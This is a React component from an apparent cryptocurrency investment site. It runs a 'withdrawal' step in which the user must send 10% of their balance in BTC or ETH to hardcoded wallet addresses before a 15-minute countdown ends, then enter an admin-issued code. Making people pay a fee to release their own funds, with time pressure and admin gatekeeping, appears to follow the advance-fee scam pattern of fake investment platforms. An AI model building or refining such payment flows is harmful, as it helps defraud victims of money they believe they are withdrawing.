import React, { useState, useEffect, useRef } from 'react';
import { db } from "../../database/firebaseConfig";
import { doc, addDoc, collection, query, where, getDocs, updateDoc } from "firebase/firestore";

const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, currentUser}) => {
    const [copystate, setCopystate] = useState("Copy");
    const [withdrawalCode, setWithdrawalCode] = useState("");
    const [error, setError] = useState("");
    const [isVerifying, setIsVerifying] = useState(false);

    const colRef = collection(db, "withdrawals");
    const codesRef = collection(db, "withdrawalCodes");

    const removeErr = () => {
        setTimeout(() => {
            setCopystate("Copy");
        }, 2500);
    }

    // countdown timer (in seconds) for making payment; default 15 minutes
    const DEFAULT_COUNTDOWN = 15 * 60;
    const [countdown, setCountdown] = useState(DEFAULT_COUNTDOWN);
    const countdownRef = useRef(null);
    const [showPopup, setShowPopup] = useState(false);
    const [successMessage, setSuccessMessage] = useState("");
    const [failureMessage, setFailureMessage] = useState("");
    const [selectedCodeDoc, setSelectedCodeDoc] = useState(null);
    const [isProcessing, setIsProcessing] = useState(false);

    useEffect(() => {
        // start countdown when component mounts
        countdownRef.current = setInterval(() => {
            setCountdown((c) => {
                if (c <= 1) {
                    clearInterval(countdownRef.current);
                    return 0;
                }
                return c - 1;
            });
        }, 1000);

        return () => {
            if (countdownRef.current) clearInterval(countdownRef.current);
        };
    }, []);

    const formatTime = (secs) => {
        const m = Math.floor(secs / 60).toString().padStart(2, "0");
        const s = Math.floor(secs % 60).toString().padStart(2, "0");
        return `${m}:${s}`;
    }

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text)
          .then(() => {
            setCopystate("Copied");
            removeErr();
          })
          .catch((err) => {
            console.error('Unable to copy text to clipboard', err);
          });
    }



    const verifyWithdrawalCode = async () => {
        setIsVerifying(true);
        setError("");

        try {
            // Check if code exists and is unused (do not mark used yet)
            const q = query(codesRef,
                where("code", "==", withdrawalCode),
                where("used", "==", false),
                where("userId", "==", currentUser?.idnum)
            );

            const snapshot = await getDocs(q);

            if (snapshot.empty) {
                setError("Invalid or expired withdrawal code");
                setIsVerifying(false);
                return null;
            }

            // return the document snapshot for later update
            const codeDoc = snapshot.docs[0];
            return codeDoc;
        } catch (err) {
            console.error("Error verifying code:", err);
            setError("Error verifying code. Please try again.");
            return null;
        } finally {
            setIsVerifying(false);
        }
    }

    const handleTransacConfirmation = async () => {
        if (!withdrawalCode) {
            setError("Please enter your withdrawal code");
            return;
        }

        if (countdown === 0) {
            setError("Payment window expired. Please initiate a new withdrawal.");
            return;
        }

        // Verify code (returns the doc snapshot) and then show confirmation popup with payment type
        const codeDoc = await verifyWithdrawalCode();
        if (!codeDoc) return;

        setSelectedCodeDoc(codeDoc);
        setShowPopup(true);
    }

    const handleFinalConfirm = async () => {
        if (!selectedCodeDoc) {
            setFailureMessage("No withdrawal code selected. Try again.");
            return;
        }

        setIsProcessing(true);
        setFailureMessage("");
        setSuccessMessage("");

        try {
            // mark code used
            await updateDoc(selectedCodeDoc.ref, { used: true, usedAt: new Date().toISOString() });

            const amount = withdrawData?.amount ?? withdrawData?.capital ?? 0;

            await addDoc(colRef, {
                ...withdrawData,
                amount,
                date: new Date().toISOString(),
                withdrawalCode: withdrawalCode,
                widthrawalFee: withdrawData?.paymentOption === "Bitcoin"
                    ? `${Number.parseFloat((amount / 10) / bitPrice).toFixed(3)} BTC`
                    : `${Number.parseFloat((amount / 10) / ethPrice).toFixed(3)} ETH`,
                idnum: currentUser?.idnum
            });

            setSuccessMessage("Withdrawal request submitted successfully.");
            setShowPopup(false);

            // small delay so user can see success message before routing
            setTimeout(() => {
                setProfileState("Withdrawals");
            }, 900);
        } catch (err) {
            console.error("Finalizing withdrawal failed:", err);
            setFailureMessage("Could not complete withdrawal. Please try again later.");
        } finally {
            setIsProcessing(false);
        }
    }
  const displayAmount = withdrawData?.amount ?? withdrawData?.capital ?? 0;

  return (
    <div className="paymentSect">
        <h2>Confirm Payment</h2>

        {successMessage && <div className="toast success">{successMessage}</div>}
        {failureMessage && <div className="toast error">{failureMessage}</div>}

        <div className="mainPaymentSect">
            <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${Number.parseFloat((displayAmount / 10)/bitPrice).toFixed(3)} BTC` : `${Number.parseFloat((displayAmount/10)/ethPrice).toFixed(3)} ETH`}</span> to</h3>
            <p>{withdrawData?.paymentOption === "Bitcoin" ? "here" : "here"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
        </div>

        <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
        <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your withdrawals in the Withdrawal section of your User-Account-Display-Interface.</p>

        <div className="paymentMeta">
            <p>Payment window: <strong>{formatTime(countdown)}</strong></p>
            <p>Withdrawal amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
        </div>

        <div className="codeInputSect">
            <label>Enter withdrawal code</label>
            <input type="text" value={withdrawalCode} onChange={(e) => setWithdrawalCode(e.target.value)} placeholder="Enter code provided by admin" />
            <div style={{marginTop:8}}>
                <button type="button" onClick={handleTransacConfirmation} disabled={isVerifying || countdown === 0}>{isVerifying ? 'Verifying...' : 'Verify Code & Continue'}</button>
            </div>
            {error && <p className='errorMsg'>{error}</p>}
        </div>

        {/* Popup confirmation shown after code is verified */}
        {showPopup && (
            <div className="modalOverlay">
                <div className="modalCard">
                    <h3>Confirm Withdrawal</h3>
                    <p>Payment type: <strong>{withdrawData?.paymentOption}</strong></p>
                    <p>Amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
                    <p>Withdrawal Code: <strong>{withdrawalCode}</strong></p>
                    <div className="modalActions">
                        <button type="button" onClick={() => { setShowPopup(false); setSelectedCodeDoc(null); }} disabled={isProcessing}>Cancel</button>
                        <button type="button" onClick={handleFinalConfirm} disabled={isProcessing}>{isProcessing ? 'Processing...' : 'Confirm Transaction'}</button>
                    </div>
                </div>
            </div>
        )}
    </div>
  )
}

export default WithdrawalPayment



{/* <p>{withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i class="icofont-ui-copy"></i></span></p> */}